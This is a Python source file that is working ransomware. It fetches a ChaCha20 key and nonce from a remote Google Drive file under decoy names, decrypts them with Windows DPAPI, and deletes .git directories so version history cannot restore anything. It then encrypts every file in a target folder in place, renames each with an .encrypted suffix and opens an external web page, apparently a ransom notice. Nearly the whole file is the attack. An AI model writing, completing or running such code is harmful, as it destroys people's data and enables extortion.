import struct
import os
from pathlib import Path
import stat
import shutil
import sys
import win32crypt
import winreg
import io
import requests
import ast
import webbrowser
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseDownload

def rotl32(v, n):
    return ((v << n) & 0xFFFFFFFF) | (v >> (32 - n))

def chacha_quarter_round(a, b, c, d):
    a = (a + b) & 0xFFFFFFFF
    d ^= a
    d = rotl32(d, 16)
    c = (c + d) & 0xFFFFFFFF
    b ^= c
    b = rotl32(b, 12)
    a = (a + b) & 0xFFFFFFFF
    d ^= a
    d = rotl32(d, 8)
    c = (c + d) & 0xFFFFFFFF
    b ^= c
    b = rotl32(b, 7)
    return a, b, c, d

def chacha_block(key, counter, nonce):
    constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]
    state = [
        constants[0], constants[1], constants[2], constants[3],
        *struct.unpack('<8L', key),
        counter,
        *struct.unpack('<3L', nonce)
    ]
    working_state = state.copy()

    for _ in range(10):
        working_state[0], working_state[4], working_state[8], working_state[12] = chacha_quarter_round(*[working_state[i] for i in [0,4,8,12]])
        working_state[1], working_state[5], working_state[9], working_state[13] = chacha_quarter_round(*[working_state[i] for i in [1,5,9,13]])
        working_state[2], working_state[6], working_state[10], working_state[14] = chacha_quarter_round(*[working_state[i] for i in [2,6,10,14]])
        working_state[3], working_state[7], working_state[11], working_state[15] = chacha_quarter_round(*[working_state[i] for i in [3,7,11,15]])

        working_state[0], working_state[5], working_state[10], working_state[15] = chacha_quarter_round(*[working_state[i] for i in [0,5,10,15]])
        working_state[1], working_state[6], working_state[11], working_state[12] = chacha_quarter_round(*[working_state[i] for i in [1,6,11,12]])
        working_state[2], working_state[7], working_state[8], working_state[13] = chacha_quarter_round(*[working_state[i] for i in [2,7,8,13]])
        working_state[3], working_state[4], working_state[9], working_state[14] = chacha_quarter_round(*[working_state[i] for i in [3,4,9,14]])

    for i in range(16):
        working_state[i] = (working_state[i] + state[i]) & 0xFFFFFFFF

    return struct.pack('<16L', *working_state)

def chacha_encrypt_data(key, nonce, plaintext):
    ciphertext = bytearray()
    counter = 0

    for i in range(0, len(plaintext), 64):
        block = chacha_block(key, counter, nonce)
        counter += 1
        chunk = plaintext[i:i+64]
        encrypted_chunk = bytes(a ^ b for a, b in zip(chunk, block[:len(chunk)]))
        ciphertext.extend(encrypted_chunk)

    return bytes(ciphertext)

# File System Functions
def remove_readonly(func, path, _):
    os.chmod(path, stat.S_IWRITE)
    func(path)

def clean_git_repo(folder_path):
    git_path = Path(folder_path) / '.git'
    if git_path.exists():
        try:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = Path(root) / file
                    try:
                        os.chmod(file_path, stat.S_IWRITE)
                    except Exception as e:
                        print(f"No permission for {file_path}: {e}")

            shutil.rmtree(git_path, onerror=remove_readonly)
            return True
        except Exception as e:
            print(f"Failed git {str(e)}")
            return False
    return True

def encrypt_file(file_path, key, nonce):
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()

        encrypted_data = chacha_encrypt_data(key, nonce, plaintext)

        with open(file_path, 'wb') as f:
            f.write(encrypted_data)

        return True
    except Exception as e:
        print(f"Error encrypting {file_path}: {str(e)}")
        return False

def open_page():
    url = 'https://basma12.pythonanywhere.com/'  # Replace with the URL you want to open
    webbrowser.open(url)


def encrypt_folder_in_place(folder_path, key, nonce):
    folder_path = Path(folder_path).resolve()
    if not folder_path.exists():
        print(f"Error: Folder '{folder_path}' does not exist")
        return False

    clean_git_repo(folder_path)

    encrypted_files = 0
    failed_files = 0

    print(f"\nEncrypting files in {folder_path}...")

    try:
        for root, dirs, files in os.walk(folder_path):
            dirs[:] = [d for d in dirs if not d.startswith('.')]

            for file in files:
                file_path = Path(root) / file

                if file_path.suffix == '.encrypted':
                    continue

                if encrypt_file(file_path, key, nonce):
                    new_path = file_path.with_suffix(file_path.suffix + '.encrypted')
                    file_path.rename(new_path)
                    encrypted_files += 1
                else:
                    failed_files += 1

        print(f"Files encrypted: {encrypted_files}")
        print(f"Files failed: {failed_files}")

        if encrypted_files > 0:
            open_page()

        return encrypted_files > 0

    except Exception as e:
        print(f"\nEncryption failed: {str(e)}")
        return False


def read_file_direct(file_id):
    download_url = f"https://drive.google.com/uc?export=download&id={file_id}"
    
    response = requests.get(download_url)
    if response.status_code == 200:
        return response.text
    else:
        return f"Failed to download: Status code {response.status_code}"

def extract_binary_keys(file_content):
    results = {}

    lines = file_content.split('\n')
    
    for i, line in enumerate(lines):
        if line.startswith('Instagram:'):
            binary_value = line.split('Instagram:', 1)[1].strip()
            results['instagram'] = binary_value
        
        if line.startswith('Package:'):
            binary_value = line.split('Package:', 1)[1].strip()
            results['package'] = binary_value
    
    return results

file_id = "1V9GTEpa1y7hVxV2OvD8KzbFESdcj81GF"
content = read_file_direct(file_id)
keys = extract_binary_keys(content)

def decrypt_key_dpapi(encrypted: bytes):
    return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]

if __name__ == "__main__":
    key_hex = keys.get("instagram")
    nonce_hex = keys.get("package")

    instagram_bytes = ast.literal_eval(key_hex)
    package_bytes = ast.literal_eval(nonce_hex)

    reversed_key = decrypt_key_dpapi(instagram_bytes)
    reversed_nonce = decrypt_key_dpapi(package_bytes)

    if key_hex and nonce_hex:
        try:
            key = reversed_key
            nonce = reversed_nonce

            if getattr(sys, 'frozen', False):
                script_directory = os.path.dirname(sys.executable)
            else:
                script_directory = os.path.dirname(os.path.abspath(__file__))

            target_folder = os.path.join(script_directory, "test folder")

            if encrypt_folder_in_place(target_folder, key, nonce):
                print("\nEncryption successful")
            else:
                print("\nEncryption failed")

        except ValueError:
            print("Invalid key or nonce format in environment variables.")
    else:
        print("Environment variables CHACHA_KEY and CHACHA_NONCE not found. ")
